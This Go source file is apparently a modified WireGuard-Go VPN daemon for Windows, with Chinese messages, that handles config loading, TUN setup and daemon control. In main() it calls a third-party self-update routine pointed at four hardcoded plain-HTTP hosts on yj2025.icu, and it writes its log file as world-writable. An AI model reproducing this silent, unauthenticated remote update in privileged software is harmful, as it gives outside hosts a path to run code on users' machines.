/* SPDX-License-Identifier: MIT
 *
 * Copyright (C) 2017-2025 WireGuard LLC. All Rights Reserved.
 */

package main

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"

	flag "github.com/spf13/pflag"
	"golang.org/x/sys/windows"
	"golang.zx2c4.com/wireguard/conn"
	"golang.zx2c4.com/wireguard/device"
	"golang.zx2c4.com/wireguard/ipc"
	"golang.zx2c4.com/wireguard/tun"

	logs "github.com/tea4go/gh/log4go"
	"github.com/tea4go/gh/network"
)

const (
	ExitSetupSuccess = 0
	ExitSetupFailed  = 1
)

func printUsage() {
	fmt.Fprintf(os.Stderr, "用法: %s -c <配置文件.conf|配置包.zip>\n", filepath.Base(os.Args[0]))
}

func printFullUsage() {
	exeName := filepath.Base(os.Args[0])
	ver := appVer
	if ver == "" {
		ver = "0.0.1"
	}
	buildTime := BuildTime
	if buildTime == "" {
		buildTime = "-"
	}
	isBeta := IsBeta
	if isBeta == "" {
		isBeta = "false"
	}

	fmt.Printf("WireGuard-Go for Windows  用户态 WireGuard 守护进程\n")
	fmt.Printf("版本    : %s\n", ver)
	fmt.Printf("构建时间: %s\n", buildTime)
	fmt.Printf("Beta    : %s\n", isBeta)
	fmt.Printf("平台    : %s-%s\n\n", runtime.GOOS, runtime.GOARCH)

	fmt.Printf("使用方法:\n")
	fmt.Printf("  %s -c <配置文件> [其它选项]\n\n", exeName)

	fmt.Printf("选项:\n")
	fmt.Printf("  -c, --confile <路径>   (必需) 指定配置文件（.conf 单接口 或 .zip 多接口打包）。\n")
	fmt.Printf("                         也可通过 confile 环境变量指定。\n")
	fmt.Printf("  -f, --foreground       前台模式：在当前控制台直接运行，不启动守护子进程。\n")
	fmt.Printf("  -d, --daemon           (内部) 守护子进程标识，用户调用时请勿显式传入。\n")
	fmt.Printf("                         默认无参启动（且未使用 -f）会自动 fork 带 -d 的子进程。\n")
	fmt.Printf("  -q, --quit             停止当前正在运行的守护进程（通过 PID 文件匹配）。\n")
	fmt.Printf("  -S, --status           查看守护进程运行状态：PID、启动时间、运行时长。\n")
	fmt.Printf("  -h, --help             显示本帮助信息并退出。\n")
	fmt.Printf("      --version          显示版本信息并退出。\n\n")

	fmt.Printf("运行模式（默认行为 = 无 -f 时自动守护 + PID 文件管理）:\n")
	fmt.Printf("  1) 直接运行，不加 -f : 父进程启动带 --daemon 的子进程后退出，\n")
	fmt.Printf("                         子进程写入 %s PID 文件并真正执行 VPN。\n", pidFileWindows)
	fmt.Printf("  2) -f / --foreground : 不 fork，在当前控制台直接运行，不写 PID 文件。\n")
	fmt.Printf("  3) -q / --quit       : 读取 PID 文件 -> taskkill 进程 -> 删除 PID 文件。\n")
	fmt.Printf("  4) -S / --status     : 读取 PID 文件 + tasklist 探测存活，并打印运行时长。\n\n")

	fmt.Printf("环境变量（优先级 > 命令行默认值）:\n")
	fmt.Printf("  confile                等效于 --confile；若命令行已传 --confile 则以命令行为准。\n")
	fmt.Printf("  LOG_LEVEL              日志级别: verbose / debug / info / notice / warn / error / silent\n")
	fmt.Printf("                         （默认 verbose，对应 device.LogLevelVerbose）\n")
	fmt.Printf("  log_name               日志文件名标识，默认使用程序名，生成 ulog_<log_name>.txt\n")
	fmt.Printf("  log_server             远程日志服务器 host:port，会透传给守护子进程。\n")
	fmt.Printf("  RUN_CONFIG             runwin.ps1 / runwin.cmd 启动时传递的配置路径。\n\n")

	fmt.Printf("示例:\n")
	fmt.Printf("  %s -c conf\\wgtun1.conf                        # 自动守护模式加载单配置\n", exeName)
	fmt.Printf("  %s -f -c conf\\wgtun1.conf                     # 前台模式加载单配置（调试查看日志）\n", exeName)
	fmt.Printf("  %s --confile \"C:\\vpn\\tunnels.zip\"             # 多接口 ZIP 打包，自动守护\n", exeName)
	fmt.Printf("  $env:confile='conf\\wgtun1.conf'; %s           # 通过环境变量指定配置\n", exeName)
	fmt.Printf("  %s -S                                         # 查看守护状态\n", exeName)
	fmt.Printf("  %s -q                                         # 停止守护\n\n", exeName)

	fmt.Printf("配置文件格式:\n")
	fmt.Printf("  .conf  : 标准 WireGuard 配置文件，支持 [Interface] / [Peer] 段，\n")
	fmt.Printf("           其中 Interface.Address、Interface.MTU、Interface.Name 会被解析用于\n")
	fmt.Printf("           Windows 系统层的 IP 地址、MTU、接口命名设置。\n")
	fmt.Printf("  .zip   : 压缩包内包含若干 .conf 文件，每个文件对应一个独立的 TUN 接口。\n\n")

	fmt.Printf("更多信息: https://www.wireguard.com/\n")
	fmt.Printf("版权所有 (C) Jason A. Donenfeld <jason@zx2c4.com> 及本修改版贡献者。\n")
}

// 标准程序块：版本号 / 构建时间 / 是否 Beta 由构建系统通过 -ldflags "-X main.appVer=..." 方式注入
var appName string = "WireGuard"
var appVer string = "0.0.1"
var IsBeta string = ""
var BuildTime string = ""

func filepathJoin(elem ...string) string {
	path := filepath.Join(elem...)
	if runtime.GOOS == "windows" {
		return strings.ReplaceAll(path, "\\", "/")
	}
	return path
}

type runningInterface struct {
	name   string
	device *device.Device
	uapi   net.Listener
}

func startConfiguredInterface(cfg *tunnelConfig) (*runningInterface, error) {
	logs.Notice("接口 %s: 开始创建 TUN", cfg.InterfaceName)
	logger := device.NewLogger(
		device.LogLevelNotice,
		fmt.Sprintf("%s", cfg.InterfaceName),
	)

	mtu := cfg.MTU
	tunDevice, err := tun.CreateTUN(cfg.InterfaceName, mtu)
	if err != nil {
		return nil, fmt.Errorf("创建 TUN 设备失败: %w", err)
	}
	logs.Notice("接口 %s: TUN 创建成功", cfg.InterfaceName)

	interfaceName := cfg.InterfaceName
	if realInterfaceName, err := tunDevice.Name(); err == nil {
		interfaceName = realInterfaceName
	}

	dev := device.NewDevice(tunDevice, conn.NewDefaultBind(), logger)
	logger.Verbosef("配置摘要: %s", describeTunnelConfig(cfg))
	for _, peer := range cfg.Peers {
		logger.Verbosef("Peer 摘要: %s", describePeerConfig(peer))
	}
	if cfg.UAPI != "" {
		logs.Notice("接口 %s: 开始应用 WireGuard 配置", interfaceName)
		if err := dev.IpcSet(cfg.UAPI); err != nil {
			dev.Close()
			return nil, fmt.Errorf("应用配置失败: %w", err)
		}
		logs.Notice("接口 %s: WireGuard 配置应用成功", interfaceName)
		if cfg.MTU > 0 {
			logger.Verbosef("已从配置中应用 MTU=%s", strconv.Itoa(cfg.MTU))
		}
	}

	if err := dev.Up(); err != nil {
		dev.Close()
		return nil, fmt.Errorf("启动设备失败: %w", err)
	}
	logs.Notice("接口 %s: 设备启动成功", interfaceName)

	if len(cfg.Addresses) > 0 {
		logs.Notice("接口 %s: 开始应用接口地址", interfaceName)
		addressWarnings := applyInterfaceAddresses(interfaceName, cfg.Addresses)
		if len(addressWarnings) == 0 {
			logs.Notice("接口 %s: 接口地址应用完成", interfaceName)
		} else {
			for _, warning := range addressWarnings {
				logs.Error(warning)
			}
		}
	}

	logs.Notice("接口 %s: 开始关闭 IPv6 绑定", interfaceName)
	if err := disableInterfaceIPv6(interfaceName); err != nil {
		logs.Error("接口 %s: 关闭 IPv6 绑定失败: %v", interfaceName, err)
	} else {
		logs.Notice("接口 %s: IPv6 绑定已关闭", interfaceName)
	}

	uapi, err := ipc.UAPIListen(interfaceName)
	if err != nil {
		dev.Close()
		return nil, fmt.Errorf("UAPI 监听失败: %w", err)
	}
	logs.Notice("接口 %s: UAPI 监听已启动", interfaceName)

	return &runningInterface{
		name:   interfaceName,
		device: dev,
		uapi:   uapi,
	}, nil
}

func main() {
	//#region 处理输入参数
	//#region 先处理 -h / --help / --version，避免被 pflag 的默认 -h 直接输出半截信息
	for _, arg := range os.Args[1:] {
		switch arg {
		case "-h", "--help":
			printFullUsage()
			os.Exit(ExitSetupSuccess)
		case "--version":
			ver := appVer
			if ver == "" {
				ver = "0.0.1"
			}
			buildTime := BuildTime
			if buildTime == "" {
				buildTime = "-"
			}
			isBeta := IsBeta
			if isBeta == "" {
				isBeta = "false"
			}
			fmt.Printf("wireguard-go %s\n", ver)
			fmt.Printf("  Build Time : %s\n", buildTime)
			fmt.Printf("  Platform   : %s-%s\n\n", runtime.GOOS, runtime.GOARCH)
			os.Exit(ExitSetupSuccess)
		}
	}
	//#endregion

	pconfile := flag.StringP("confile", "c", "", "配置文件")
	pforeground := flag.BoolP("foreground", "f", false, "前台运行（不启动守护进程，直接在当前控制台执行）")
	pquit := flag.BoolP("quit", "q", false, "停止正在运行的守护进程")
	pstatus := flag.BoolP("status", "S", false, "查看守护进程运行状态")
	pdaemon := flag.BoolP("daemon", "d", false, "(内部) 以守护进程子进程模式运行，外部用户请省略本参数或使用默认无参启动自动守护")

	flag.Usage = func() {
		printFullUsage()
	}
	_ = flag.CommandLine.MarkHidden("daemon")
	flag.Parse()

	confile := logs.GetParamString("confile", *pconfile, "/etc/wireguard/wgtun.conf")
	//#endregion
	log_name := os.Getenv("log_name")
	if log_name == "" {
		log_name = appName
	}
	network.SetAppVersion(appName, appVer, IsBeta, BuildTime)
	logsFileName := filepathJoin(os.TempDir(), "ulog_"+log_name+".txt")
	logs.SetLogFuncCallDepth(5)
	logs.SetLogger("file", `{"filename":"`+logsFileName+`", "perm": "0666","level":5}`)
	logs.StartLogger()
	network.StartSelfUpdate("http://wc192.yj2025.icu:8118", "http://nj.yj2025.icu:23432", "http://wc8.yj2025.icu:8118", "http://wc47.yj2025.icu:23431")

	if *pquit {
		fmt.Println("停止守护进程 ......")
		daemonMgr := NewDaemonManager()
		if err := daemonMgr.StopDaemon(); err != nil {
			fmt.Printf("停止守护进程失败: %v\n", err)
			os.Exit(ExitSetupFailed)
		}
		return
	}

	if *pstatus {
		daemonMgr := NewDaemonManager()
		if daemonMgr.IsRunning() {
			pid, startTime, duration, err := daemonMgr.GetRunningInfo()
			if err != nil {
				fmt.Printf("守护进程正在运行，但获取信息失败: %v\n", err)
			} else {
				fmt.Printf("守护进程正在运行\n")
				fmt.Printf("  PID:       %d\n", pid)
				fmt.Printf("  启动时间: %s\n", startTime.Format("2006-01-02(15:04:05)"))
				fmt.Printf("  运行时长: %s\n", FormatDuration(duration))
			}
		} else {
			fmt.Println("守护进程未运行")
		}
		return
	}

	logs.Notice("当前启动参数")
	logs.Notice("= Foreground ...... %v", *pforeground)
	logs.Notice("= Daemon .......... %v", *pdaemon)
	logs.Notice("= Confile ......... %s", confile)
	if !*pforeground && !*pdaemon {
		logs.Notice("准备启动守护进程 ......")
		daemonMgr := NewDaemonManager()
		extraEnv := map[string]string{}
		if ln := os.Getenv("log_name"); ln != "" {
			extraEnv["log_name"] = ln
		} else {
			extraEnv["log_name"] = appName + "_daemon"
		}
		if lv := os.Getenv("LOG_LEVEL"); lv != "" {
			extraEnv["LOG_LEVEL"] = lv
		}
		if ls := os.Getenv("log_server"); ls != "" {
			extraEnv["log_server"] = ls
		}
		if err := daemonMgr.StartDaemon(extraEnv); err != nil {
			fmt.Println(err)
			os.Exit(ExitSetupFailed)
		}
		return
	}

	logs.Notice("========================================")
	logs.Notice("%s %s 启动", appName, appVer)
	if *pdaemon {
		logs.Notice("运行模式: 守护进程子进程")
	} else {
		logs.Notice("运行模式: 前台")
	}
	logs.Notice("========================================")

	if *pdaemon {
		daemonMgr := NewDaemonManager()
		if err := daemonMgr.WritePidFile(); err != nil {
			logs.Error("写入PID文件失败: %v", err)
			os.Exit(ExitSetupFailed)
		}
		defer daemonMgr.RemovePidFile()
	}

	var configs []*tunnelConfig
	if flag.NArg() != 0 {
		printUsage()
		fmt.Fprintln(os.Stderr, "错误: 不支持直接传接口名称，请使用 -c/--confile 指定 .conf 或 .zip 配置文件")
		os.Exit(ExitSetupFailed)
	}
	if strings.TrimSpace(confile) == "" {
		printUsage()
		fmt.Fprintln(os.Stderr, "错误: 缺少 -c/--confile 参数（配置文件路径未通过命令行或 confile 环境变量设置）")
		os.Exit(ExitSetupFailed)
	}
	var warnings []string
	configs, warnings = loadTunnelConfigs(confile)
	logs.Notice("配置来源: %s", confile)
	logs.Notice("本次共识别到 %d 个接口配置", len(configs))
	for _, warning := range warnings {
		logs.Error("配置告警: %s", warning)
	}
	for _, cfg := range configs {
		logs.Notice("配置摘要: %s", describeTunnelConfig(cfg))
	}
	logs.Notice("正在启动 %s %s", appName, appVer)

	if err := tun.CheckWintunReady(); err != nil {
		logs.Error(err)
		return
	}

	running := make([]*runningInterface, 0, len(configs))
	var networkMonitor *windowsNetworkMonitor
	type interfaceError struct {
		name string
		err  error
	}
	errs := make(chan interfaceError)
	term := make(chan os.Signal, 1)
	deviceClosed := make(chan string, len(configs))

	for _, cfg := range configs {
		ri, err := startConfiguredInterface(cfg)
		if err != nil {
			logs.Error("启动接口 %s 失败: %v", cfg.InterfaceName, err)
			continue
		}
		running = append(running, ri)
		go func(name string, listener net.Listener, dev *device.Device) {
			for {
				conn, err := listener.Accept()
				if err != nil {
					errs <- interfaceError{name: name, err: err}
					return
				}
				go dev.IpcHandle(conn)
			}
		}(ri.name, ri.uapi, ri.device)
		go func(name string, done <-chan struct{}) {
			<-done
			deviceClosed <- name
		}(ri.name, ri.device.Wait())
		logs.Notice("接口 %s 已启动", ri.name)
	}

	if len(running) == 0 {
		logs.Notice("当前没有成功启动的接口，进程将保持运行并等待终止信号")
	} else {
		var err error
		networkMonitor, err = startWindowsNetworkMonitor(func() {
			logs.Notice("检测到本地网络变化，开始刷新 WireGuard UDP 绑定")
			for _, ri := range running {
				if err := ri.device.HandleNetworkChange(); err != nil {
					logs.Error("接口 %s: 网络变化恢复失败: %v", ri.name, err)
					continue
				}
				logs.Notice("接口 %s: 网络变化恢复完成", ri.name)
			}
		})
		if err != nil {
			logs.Error("启动 Windows 网络变化监视失败: %v", err)
		} else {
			logs.Notice("Windows 网络变化监视已启动")
		}
	}

	signal.Notify(term, os.Interrupt)
	signal.Notify(term, os.Kill)
	signal.Notify(term, windows.SIGTERM)

	shutdownReason := "未知原因"
	select {
	case <-term:
		shutdownReason = "收到终止信号"
	case ifaceErr := <-errs:
		shutdownReason = fmt.Sprintf("接口 %s 的 UAPI 监听退出: %v", ifaceErr.name, ifaceErr.err)
	case name := <-deviceClosed:
		shutdownReason = fmt.Sprintf("接口 %s 已退出", name)
	}

	logs.Notice("开始关闭，原因: %s", shutdownReason)
	if networkMonitor != nil {
		networkMonitor.Close()
		logs.Notice("Windows 网络变化监视已关闭")
	}
	for _, ri := range running {
		if ri.uapi != nil {
			ri.uapi.Close()
		}
		ri.device.Close()
		logs.Notice("接口 %s 已关闭", ri.name)
	}

	logs.Notice("正在关闭")
}
